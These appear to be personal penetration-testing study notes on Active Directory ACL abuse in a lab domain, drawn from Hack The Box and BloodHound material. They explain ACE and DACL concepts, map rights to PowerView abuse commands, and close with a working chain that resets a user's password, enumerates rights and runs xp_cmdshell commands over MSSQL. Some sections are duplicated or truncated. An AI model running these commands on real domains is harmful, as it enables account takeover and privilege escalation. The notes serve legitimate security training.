ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called `Access Control Entries` (`ACEs`). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.

There are two types of ACLs:

1. `Discretionary Access Control List` (`DACL`) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.
    
2. `System Access Control Lists` (`SACL`) - allow administrators to log access attempts made to secured objects.

#### Viewing forend's ACL
We see the ACL for the user account `forend` in the image below. Each item under `Permission entries` makes up the `DACL` for the user account, while the individual entries (such as `Full Control` or `Change Password`) are ACE entries showing rights granted over this user object to various users and groups.


![Active Directory Users and Computers window showing Advanced Security Settings for 'forend' with permission entries for various principals, including 'Authenticated Users' and 'Angela Dunn'.](https://academy.hackthebox.com/storage/modules/143/DACL_example.png)

The SACLs can be seen within the `Auditing` tab.

#### Viewing the SACLs through the Auditing Tab

![Active Directory Users and Computers window showing Advanced Security Settings for 'forend' with auditing entries for 'Everyone' on descendant organizational units.](https://academy.hackthebox.com/storage/modules/143/SACL_example.png)


# ACEs
Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are `three` main types of ACEs that can be applied to all securable objects in AD:

|**ACE**|**Description**|
|---|---|
|`Access denied ACE`|Used within a DACL to show that a user or group is explicitly denied access to an object|
|`Access allowed ACE`|Used within a DACL to show that a user or group is explicitly granted access to an object|
|`System audit ACE`|Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred|

Each ACE is made up of the following `four` components:

1. The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
2. A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
3. A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
4. An [access mask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object






Looking for users with ACE of GenericALL
```
PS C:\> Get-DomainObjectAcl -ResolveGUIDs -Identity "CN=Domain Admins,CN=Users,DC=Blackwood,DC=local" | Where-Object { $_.ActiveDirectoryRights -like "GenericAll"}
```




## Access Control List (ACL) Overview

In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called `Access Control Entries` (`ACEs`). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.

There are two types of ACLs:

1. `Discretionary Access Control List` (`DACL`) - defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.
    
2. `System Access Control Lists` (`SACL`) - allow administrators to log access attempts made to secured objects.

# ACE
Each ACE is made up of the following `four` components:

1. The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
2. A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
3. A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
4. An [access mask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object

We can view this graphically in `Active Directory Users and Computers` (`ADUC`). In the example image below, we can see the
We see the ACL for the user account `forend` in the image below. Each item under `Permission entries` makes up the `DACL` for the user account, while the individual entries (such as `Full Control` or `Change Password`) are ACE entries showing rights granted over this user object to various users and groups.
![](security/Screenshots/Pasted%20image%2020241130164439.png)
he SACLs can be seen within the `Auditing` tab.
## Why are ACEs Important?

Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the "low hanging fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:

- `ForceChangePassword` abused with `Set-DomainUserPassword`
- `Add Members` abused with `Add-DomainGroupMember`
- `GenericAll` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `GenericWrite` abused with `Set-DomainObject`
- `WriteOwner` abused with `Set-DomainObjectOwner`
- `WriteDACL` abused with `Add-DomainObjectACL`
- `AllExtendedRights` abused with `Set-DomainUserPassword` or `Add-DomainGroupMember`
- `Addself` abused with `Add-DomainGroupMember`
#### Viewing the SACLs through the Auditing Tab

![image](https://academy.hackthebox.com/storage/modules/143/SACL_example.png)

![](security/Screenshots/Pasted%20image%2020241130170352.png)

We will run into many other interesting ACEs (privileges) in Active Directory from time to time. The methodology for enumerating possible ACL attacks using tools such as BloodHound and PowerView and even built-in AD management tools should be adaptable enough to assist us whenever we encounter new privileges in the wild that we may not yet be familiar with. For example, we may import data into BloodHound and see that a user we have control over (or can potentially take over) has the rights to read the password for a Group Managed Service Account (gMSA) through the [ReadGMSAPassword](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readgmsapassword) (
## ReadGMSAPassword[](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#readgmsapassword "Permalink to this headline")

This privilege allows you to read the password for a Group Managed Service Account (GMSA). Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute).

The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.`;

### Abuse Info[](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#id64 "Permalink to this headline")

There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA.

If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA’s password, simply steal the token from the process running as the GMSA, or inject into that process.

If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the “HasSession” help modal for more details). Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash, then perform overpass-the-hash to retrieve a Kerberos ticket for the GMSA:)



edge. In this case, there are tools such as [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) that we could use, along with other methods, to obtain the password for the service account in question. Other times we may come across extended rights such as [Unexpire-Password](https://learn.microsoft.com/en-us/windows/win32/adschema/r-unexpire-password) or [Reanimate-Tombstones](https://learn.microsoft.com/en-us/windows/win32/adschema/r-reanimate-tombstones) using PowerView and have to do a bit of research to figure out how to exploit these for our benefit. It's worth familiarizing yourself with all of the [BloodHound edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) and as many Active Directory [Extended Rights](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) as possible as you never know when you may encounter a less common one during an assessment.

---

## ACL Attacks in the Wild

We can use ACL attacks for:

- Lateral movement
- Privilege escalation
- Persistence

Some common attack scenarios may include:

|Attack|Description|
|---|---|
|`Abusing forgot password permissions`|Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain.|
|`Abusing group membership management`|It's also common to see Help Desk and other staff that have the right to add/remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege.|
|`Excessive user rights`|We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.|

There are many other possible attack scenarios in the world of Active Directory ACLs, but these three are the most common. We will cover enumerating these rights in various ways, performing the attacks, and cleaning up after ourselves.

**Note:** Some ACL attacks can be considered "destructive," such as changing a user's password or performing other modifications within a client's AD domain. If in doubt, it's always best to run a given attack by our client before performing it to have written documentation of their approval in case an issue arises. We should always carefully document our attacks from start to finish and revert any changes. This data should be included in our report, but we should also highlight any changes we make clearly so that the client can go back and verify that our changes were indeed reverted properly.

```
PS C:\Tools> Get-DomainObjectAcl -Identity *| ? {$_.SecurityIdentifier -eq $sid}                                                                                                                                                                objectDN              : CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=BLACKWOOD,DC=LOCAL      

ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1152                                                  
ActiveDirectoryRights : GenericAll                                                                                      
BinaryLength          : 36                                                                                              
AceQualifier          : AccessAllowed                                                                                   
IsCallback            : False                                                                                           
OpaqueLength          : 0                                                                                               
AccessMask            : 983551                                                   
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-5614           
AceType               : AccessAllowed                                            
AceFlags              : ContainerInherit                                         
IsInherited           : False                                                    
InheritanceFlags      : ContainerInherit                                         
PropagationFlags      : None                                                                                           
AuditFlags            : None
GUID$ = 
```

Get user rights over a group:
```powershell
> Get-ObjectAcl -Identity "GPO Management" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq $sid }


AceQualifier           : AccessAllowed
ObjectDN               : CN=GPO Management,OU=Security Groups,OU=Corp,DC=BLACKWOOD,DC=LOCAL
ActiveDirectoryRights  : Self
ObjectAceType          : Self-Membership
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-4046
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-5614
AccessMask             : 8
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

AceType               : AccessAllowed
ObjectDN              : CN=GPO Management,OU=Security Groups,OU=Corp,DC=BLACKWOOD,DC=LOCAL
ActiveDirectoryRights : ReadProperty, WriteProperty, GenericExecute
OpaqueLength          : 0
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-4046
InheritanceFlags      : ContainerInherit
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-5614
AccessMask            : 131124
AuditFlags            : None
AceFlags              : ContainerInherit
AceQualifier          : AccessAllowed

```

```powershell-session
PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

# Abusing ACL
wley -> change pass -> damndsun 
damundsn -genericAll ->    (helpdsek 1)
Help Desk - (nested of information technology)
IT -> GENERICALL -> adun (admin)
damundsen(IT) -> change pass -> set SPN -> adunn

transporter@4 wley
#### Creating a PSCredential Object

ACL Abuse Tactics

```powershell-session
> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
```

create credential object for a user that controls another object(user, entity) in this case wley controls damunsen with ACL generic write
```
> $Cred = New-Object System.Management.Automation.PSCredential('BLACKWOOD\wley', $SecPassword) 
```

set thje new pass for user damundsen
```
PS C:\Tools> $dampass = ConvertTo-SecureString '!@dampassxdddGetFuckingPOwned131' -AsPlainText -Force
```
change the pass
```
PS C:\Tools> Set-DomainUserPassword -Identity damundsen -AccountPassword $dampass -Credential $wleyCredOBj -Verbose
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

add damundsen to Help desk

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces

os commands via powerupsql
```
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "Blackwood\damundsen" -password "SQL1234!" -query 'EXEC xp_cmdshell ''powershell -c cat c:\Users\damundsen\Desktop\flag.txt
```

mssqlclient
```
.\mssqlclient.exe -windows-auth BLACKWOOD/DAMUNDSEN@172.16.5.150

enable_xp_cmdshell
xp_cmdshell whoami /priv

```
![](security/Screenshots/Pasted%20image%2020241212181423.png)